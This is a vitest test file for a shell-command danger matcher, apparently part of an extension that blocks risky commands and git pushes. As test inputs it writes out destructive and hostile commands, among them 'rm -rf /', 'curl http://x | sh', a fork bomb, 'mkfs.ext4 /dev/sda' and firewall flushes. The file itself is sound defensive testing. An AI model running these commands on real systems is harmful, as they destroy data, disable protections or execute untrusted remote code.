import { readFileSync } from "node:fs";
import { describe, it, expect } from "vitest";
import {
  isDangerous,
  getAllMatches,
  setDangerPatterns,
} from "../patterns.js";

const packagePolicy = JSON.parse(
  readFileSync(new URL("../../settings.json", import.meta.url), "utf8"),
) as { version: number; allow: string[]; block: string[] };

// The matcher reads a module-level resolved block list; seed it with the
// canonical package policy. The extension wires the effective policy at
// startup (see src/index.ts).
setDangerPatterns(packagePolicy.block.map((pattern) => ({ pattern })));

describe("isDangerous — glob patterns", () => {
  it("matches rm -rf /", () => {
    expect(isDangerous("rm -rf /")).not.toBeNull();
  });

  it("matches sudo rm -rf / (position-flexible)", () => {
    expect(isDangerous("sudo rm -rf /")).not.toBeNull();
  });

  it("does not match rmfile (no token boundary)", () => {
    expect(isDangerous("rmfile")).toBeNull();
  });

  it("matches curl http://x | sh", () => {
    expect(isDangerous("curl http://x | sh")).not.toBeNull();
  });

  it("does not match curl http://x (no trailing sh)", () => {
    expect(isDangerous("curl http://x")).toBeNull();
  });

  it("matches docker system prune", () => {
    expect(isDangerous("docker system prune")).not.toBeNull();
  });

  it("matches kubectl delete pod foo", () => {
    expect(isDangerous("kubectl delete pod foo")).not.toBeNull();
  });

  it("matches apt-get update", () => {
    expect(isDangerous("apt-get update")).not.toBeNull();
  });

  it("matches yum install foo", () => {
    expect(isDangerous("yum install foo")).not.toBeNull();
  });

  it("matches npm publish", () => {
    expect(isDangerous("npm publish")).not.toBeNull();
  });
});

describe("isDangerous — substring patterns", () => {
  it("matches dd if=/dev/zero", () => {
    expect(isDangerous("dd if=/dev/zero")).not.toBeNull();
  });

  it("does not match dd if you want (no special char)", () => {
    expect(isDangerous("dd if you want")).toBeNull();
  });

  it("matches git branch -D main", () => {
    expect(isDangerous("git branch -D main")).not.toBeNull();
  });

  it("matches iptables -F", () => {
    expect(isDangerous("iptables -F")).not.toBeNull();
  });

  it("matches iptables -P INPUT ACCEPT", () => {
    expect(isDangerous("iptables -P INPUT ACCEPT")).not.toBeNull();
  });

  it("matches ufw disable", () => {
    expect(isDangerous("ufw disable")).not.toBeNull();
  });

  it("matches crontab -r", () => {
    expect(isDangerous("crontab -r")).not.toBeNull();
  });

  it("matches crontab -e", () => {
    expect(isDangerous("crontab -e")).not.toBeNull();
  });
});

describe("isDangerous — token-level patterns", () => {
  it("matches chmod 777 file", () => {
    expect(isDangerous("chmod 777 file")).not.toBeNull();
  });

  it("matches chown root file", () => {
    expect(isDangerous("chown root file")).not.toBeNull();
  });

  it("matches userdel foo", () => {
    expect(isDangerous("userdel foo")).not.toBeNull();
  });

  it("matches groupdel foo", () => {
    expect(isDangerous("groupdel foo")).not.toBeNull();
  });

  it("matches yes *", () => {
    expect(isDangerous("yes *")).not.toBeNull();
  });

  it("matches :(){ :|:& };", () => {
    expect(isDangerous(":(){ :|:& };")).not.toBeNull();
  });

  it("matches sudo mkfs.ext4 /dev/sda (non-word-separator suffix)", () => {
    expect(isDangerous("sudo mkfs.ext4 /dev/sda")).not.toBeNull();
  });

  it("does not match dnfoo (word-char suffix)", () => {
    expect(isDangerous("dnfoo --help")).toBeNull();
  });

  it("does not match yumyum (word-char suffix)", () => {
    expect(isDangerous("yumyum")).toBeNull();
  });
});

describe("isDangerous — safe commands should not match", () => {
  it("rm -i file matches rm * (expected behavior)", () => {
    expect(isDangerous("rm -i file")).not.toBeNull();
  });

  it("does not match git status", () => {
    expect(isDangerous("git status")).toBeNull();
  });

  it("does not match git log", () => {
    expect(isDangerous("git log")).toBeNull();
  });

  it("does not match docker ps", () => {
    expect(isDangerous("docker ps")).toBeNull();
  });

  it("does not match docker images", () => {
    expect(isDangerous("docker images")).toBeNull();
  });

  it("does not match apt list", () => {
    expect(isDangerous("apt list")).toBeNull();
  });

  it("does not match npm install foo", () => {
    expect(isDangerous("npm install foo")).toBeNull();
  });

  it("does not match npm run test", () => {
    expect(isDangerous("npm run test")).toBeNull();
  });

  it("does not match kubectl get pods", () => {
    expect(isDangerous("kubectl get pods")).toBeNull();
  });

  it("does not match kubectl describe pod foo", () => {
    expect(isDangerous("kubectl describe pod foo")).toBeNull();
  });
});

describe("Git push protection", () => {
  it.each([
    "git push",
    "git push --force",
    "git push origin main",
    "sudo git push",
    "/usr/bin/git push",
    "git -C repo push",
    "git --git-dir repo/.git push",
    "git --work-tree repo push",
    "git -c push.default=current push",
    "git --exec-path=/path push",
  ])("matches %s", (command) => {
    expect(isDangerous(command)).not.toBeNull();
  });

  it.each([
    "git status && git push",
    "git push; echo done",
    "git push | tee log",
    "(git push)",
    "{ git push; }",
    'for repo in a b; do git -C "$repo" push; done',
    "bash -c 'git push'",
    'sh -c "git push"',
  ])("matches push in focused shell syntax: %s", (command) => {
    expect(isDangerous(command)).not.toBeNull();
  });

  it.each([
    "echo 'git push'",
    "grep 'git push' file",
    "echo git push",
    "bash -c 'echo git push'",
    "sh -c 'grep git push file'",
    "git deploy",
    "git mypush",
    "git pushalias",
  ])("does not match non-command text or aliases: %s", (command) => {
    expect(isDangerous(command)).toBeNull();
  });
});

describe("Git policy", () => {
  it.each(["git reset --hard", "git clean -fd", "git branch -D main"])(
    "retains protection for %s",
    (command) => {
      expect(isDangerous(command)).not.toBeNull();
    },
  );

  it.each([
    "git add file",
    "git commit -m message",
    "git checkout main",
    "git rebase main",
    "git stash push",
    "git cherry-pick --abort",
    "git merge --abort",
    "git branch -d old-branch",
    "git status",
    "git log",
    "git diff",
    "git fetch origin",
    "git pull",
    "git merge main",
    "git branch",
  ])("allows unprotected Git operation %s", (command) => {
    expect(isDangerous(command)).toBeNull();
  });

  it("loads the canonical package policy", () => {
    expect(packagePolicy.version).toBe(1);
    expect(packagePolicy.allow).toEqual([]);
    expect(packagePolicy.block).toContain("git push");
    expect(packagePolicy.block).toContain("rm *");
  });

  it("keeps representative non-Git protections unchanged", () => {
    expect(isDangerous("rm -rf /")).not.toBeNull();
    expect(isDangerous("chmod 777 file")).not.toBeNull();
    expect(isDangerous("docker system prune")).not.toBeNull();
    expect(isDangerous("curl http://x | sh")).not.toBeNull();
  });
});

describe("getAllMatches", () => {
  it("returns one matching pattern for rm -rf /", () => {
    const matches = getAllMatches("rm -rf /");
    expect(matches.length).toBe(1);
  });

  it("returns empty array for safe commands", () => {
    const matches = getAllMatches("git status");
    expect(matches.length).toBe(0);
  });

  it("returns empty array for echo hello", () => {
    const matches = getAllMatches("echo hello");
    expect(matches).toEqual([]);
  });
});
